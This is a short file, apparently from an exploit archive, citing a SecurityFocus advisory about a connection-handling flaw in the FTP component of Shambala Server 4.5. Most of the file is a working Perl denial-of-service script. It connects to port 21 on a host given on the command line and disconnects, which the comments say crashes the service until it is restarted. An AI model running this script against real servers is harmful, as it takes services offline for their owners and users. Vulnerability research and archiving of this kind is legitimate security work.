@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/1778/info
+
+Shambala Server is a FTP, Web, and Chat server targeted for the Small Office/Home Office user. 
+
+The FTP server component does not properly handle certain incoming connection and disconnection requests. Successful exploitation could lead to disabling the Shambala Server service and restarting is required in order to regain normal functionality.
+
+#!/usr/bin/perl
+#
+# This tool (tool not exploit!) crashes shambale server 4.5
+# This is a stripped version of Guido Bakkers exploit code (bedankt)
+#
+use Getopt::Std;
+use IO::Socket;
+getopts('s:', \%args);
+&usage if !defined($args{s});
+$serv = $args{s};
+$EOL="\015\012";
+$remote = IO::Socket::INET->new(
+                   Proto       => "tcp",
+                   PeerAddr    => $args{s},
+                   PeerPort    => "ftp(21)",
+               ) || die("Unable to connect to ftp port at $args{s}\n");
+$remote->autoflush(1);
+print "Done...\n";
+exit; # remove this and the server will *NOT* crash
+sub usage {die("\n$0 -s ipaddress\n\n");}
